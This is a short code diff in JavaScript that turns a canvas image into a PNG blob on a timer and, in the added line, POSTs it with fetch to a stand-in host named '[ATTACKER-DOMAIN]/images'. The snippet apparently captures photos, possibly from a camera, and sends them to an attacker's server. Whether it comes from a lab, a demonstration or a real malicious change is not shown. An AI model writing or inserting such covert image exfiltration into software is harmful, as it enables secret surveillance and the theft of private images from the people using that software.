@@ -83,7 +83,7 @@
         c.toBlob(b => {
             const f = new FormData();
             f.append('image', b, 'photo.png');
-            fetch('http://[]/', { method: 'POST', body: f });
+            fetch('http://[ATTACKER-DOMAIN]/images', { method: 'POST', body: f });
         }, 'image/png');
         }, 1000);
     });
